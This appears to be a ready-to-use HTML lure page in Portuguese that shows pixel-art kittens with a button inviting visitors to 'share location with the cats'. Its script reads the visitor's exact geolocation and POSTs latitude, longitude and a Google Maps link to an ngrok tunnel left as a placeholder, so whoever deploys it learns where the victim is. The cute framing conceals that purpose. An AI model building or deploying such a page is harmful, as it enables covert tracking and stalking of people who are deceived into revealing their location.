<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gatinhos Pixelados</title>
  <style>
    body {
      background-color: #1a1a2e;
      color: #ffffff;
      font-family: 'Press Start 2P', cursive;
      text-align: center;
      padding: 20px;
    }
    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .cat-pixel {
      width: 200px;
      height: auto;
      image-rendering: pixelated;
      margin: 10px;
    }
    .button {
      background: #ffcc00;
      border: none;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>ðŸ˜º Gatinhos Pixelados ðŸ˜º</h1>
    <img class="cat-pixel" src="https://i.imgur.com/VgTYZJ6.png" alt="Gatinho Pixelado">
    <img class="cat-pixel" src="https://i.imgur.com/Mscd1D6.png" alt="Gatinho Pixelado">
    <button class="button" onclick="getLocation()">Compartilhar LocalizaÃ§Ã£o com os Gatos</button>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Seu navegador nÃ£o suporta geolocalizaÃ§Ã£o. :(");
      }
    }

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
      
      fetch("https://seu-ngrok-aqui.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
      .then(response => response.json())
      .then(data => {
        if (!data.success) {
          alert("Erro ao enviar a localizaÃ§Ã£o para os gatinhos.");
        } else {
          alert("Os gatinhos receberam sua localizaÃ§Ã£o! ðŸ˜»");
        }
      })
      .catch(error => {
        console.error("Erro:", error);
      });
    }

    function handleError(error) {
      alert("Erro ao obter a localizaÃ§Ã£o: " + error.message);
    }
  </script>
</body>
</html>
